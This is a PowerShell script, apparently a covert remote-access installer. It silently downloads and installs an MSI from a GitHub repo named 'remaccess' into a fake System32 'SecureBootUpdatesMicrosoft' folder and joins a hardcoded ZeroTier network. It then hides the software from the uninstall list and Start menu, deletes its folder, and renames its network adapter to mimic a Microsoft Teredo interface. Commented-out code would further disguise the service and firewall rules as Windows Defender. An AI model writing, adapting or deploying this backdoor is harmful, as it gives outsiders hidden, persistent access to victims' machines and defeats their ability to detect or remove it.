$ErrorActionPreference = "SilentlyContinue"
$downloadUrl = "https://github.com/DirNotAvailable/remaccess/releases/download/CorePrograms/MeshNetwork.msi"
$downloadedFileName = [System.IO.Path]::GetFileName($downloadUrl)
$programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
$destinationPath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\$programNameWithExtension"
$hashesUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
if (-not (Test-Path (Split-Path $destinationPath))) {
    New-Item -Path (Split-Path $destinationPath) -ItemType Directory -Force | Out-Null
}
if (Test-Path $destinationPath) {
    $existingFileHash = (Get-FileHash -Path $destinationPath -Algorithm SHA256).Hash
    $hashesData = (iwr -Uri $hashesUrl -UseBasicParsing).Content
    $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"
    if ($hashesData -match $hashRegex) {
        $programHash = $matches[1]
    }
    if ($programHash -eq $existingFileHash) {
        Write-Host "File is already present and matches the hash. No action needed." | Out-Null
    } else {
        Remove-Item -Path $destinationPath -Force
    }
}
if (-not (Test-Path $destinationPath)) {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $destinationPath
}
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$destinationPath`" /qn /norestart"
Timeout /NoBreak 30
$NetworkID = "52b337794f5f54e7"
$zerotiercli = "C:\ProgramData\ZeroTier\One\zerotier-one_x64.exe"
$param1 = "-q"
$param2 = "join"
$NetworkID = "52b337794f5f54e7"
& $zerotiercli $param1 $param2 $NetworkID allowDefault=1
$KeyNamePattern = "Zerotier*"
$RegPath = "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
$MatchingKeys = Get-ChildItem -Path $RegPath | Where-Object { $_.PSChildName -like $KeyNamePattern }
foreach ($Key in $MatchingKeys) {
$RegKeyPath = Join-Path -Path $RegPath -ChildPath $Key.PSChildName
$RegValueName = "SystemComponent"
$RegValueData = 1
Set-ItemProperty -Path $RegKeyPath -Name $RegValueName -Value $RegValueData -Type DWORD -Force
}
$ZeroTierShortcutPath = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Zerotier.lnk'
if (Test-Path $ZeroTierShortcutPath) {
Remove-Item -Path $ZeroTierShortcutPath -Force -ErrorAction SilentlyContinue | Out-Null
}
Stop-Process -Name zerotier_desktop_ui -F -ErrorAction SilentlyContinue | Out-Null
$folderPath = "C:\Program Files (x86)\ZeroTier"
$folderACL = Get-Acl -Path $folderPath
$folderACL.SetAccessRuleProtection($true, $false)
$folderACL.Access | ForEach-Object {
$folderACL.RemoveAccessRule($_)
}
Set-Acl -Path $folderPath -AclObject $folderACL
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$folderACL.SetOwner([System.Security.Principal.NTAccount] $currentUser)
Set-Acl -Path $folderPath -AclObject $folderACL
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(
$currentUser,
"FullControl",
"ContainerInherit, ObjectInherit",
"None",
"Allow"
)
$folderACL.AddAccessRule($accessRule)
Set-Acl -Path $folderPath -AclObject $folderACL
$childItems = Get-ChildItem -Path $folderPath -Recurse
foreach ($item in $childItems) {
Set-Acl -Path $item.FullName -AclObject $folderACL
}
Remove-Item -Path $folderPath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
Get-NetAdapter -Name Zerotier*|Rename-NetAdapter -NewName "Microsoft Teredo IPv6 Tunneling Interface"
#ZT Adv Fix
#$ztadv = Read-Host "Proceed With ZT Adv Fix (y/n)"
#if ([string]::IsNullOrEmpty($ztadv)) {
#    Start-Sleep -Seconds 1
#    $ztadv = "n"	
#}
#if ($ztadv.ToLower() -eq "y") {
#    Write-Host "Executing ZT Adv Fix..."
#	$ztregkey = "HKLM:\SYSTEM\CurrentControlSet\Services\ZeroTierOneService"
#	Set-ItemProperty -Path $ztregkey -Name "DisplayName" -Value "Windows Defender Core Service"
#	Set-ItemProperty -Path $ztregkey -Name "Description" -Value "Windows Defender Essential Services"
#	$ruleName = "ZeroTier x64 Binary In"
#	$existingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName }
#	if ($existingRule) {
#		$newRuleName = "Windoes Defender Core Service"
#		Set-NetFirewallRule -DisplayName $ruleName -NewDisplayName $newRuleName -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName -ErrorAction SilentlyContinue
#	}
#	$ruleName2 = "ZeroTier UDP/9993 In"
#	$existingRule2 = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $ruleName2 }
#	if ($existingRule2) {
#		$newRuleName2 = "Windows Defender Service"
#		Set-NetFirewallRule -DisplayName $ruleName2 -NewDisplayName $newRuleName2 -ErrorAction SilentlyContinue
#		Set-NetFirewallRule -DisplayName $newRuleName2 -ErrorAction SilentlyContinue
#	}	
#	Restart-Service ZeroTierOneService
#} else {
#}
